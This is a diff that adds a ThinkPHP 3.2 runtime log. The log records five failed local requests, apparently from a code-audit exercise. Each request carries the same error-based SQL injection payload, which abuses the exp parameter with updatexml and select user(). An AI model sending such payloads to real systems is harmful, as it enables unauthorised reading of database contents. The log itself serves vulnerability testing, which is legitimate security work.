@@ -1,0 +1,30 @@
+[ 2019-04-02T20:28:44+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index?name[0]=exp&name[1]==%27xxx%27%20and%20updatexml(1,concat(0x7e,(select%20user()),1),1)
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000049s ]
+ERR: 无法加载模块:Shenji
+
+[ 2019-04-02T20:28:45+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index?name[0]=exp&name[1]==%27xxx%27%20and%20updatexml(1,concat(0x7e,(select%20user()),1),1)
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000074s ]
+ERR: 无法加载模块:Shenji
+
+[ 2019-04-02T20:28:46+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index?name[0]=exp&name[1]==%27xxx%27%20and%20updatexml(1,concat(0x7e,(select%20user()),1),1)
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000049s ]
+ERR: 无法加载模块:Shenji
+
+[ 2019-04-02T20:28:47+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index?name[0]=exp&name[1]==%27xxx%27%20and%20updatexml(1,concat(0x7e,(select%20user()),1),1)
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000093s ]
+ERR: 无法加载模块:Shenji
+
+[ 2019-04-02T20:28:47+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/index?name[0]=exp&name[1]==%27xxx%27%20and%20updatexml(1,concat(0x7e,(select%20user()),1),1)
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000054s ]
+ERR: 无法加载模块:Shenji
+
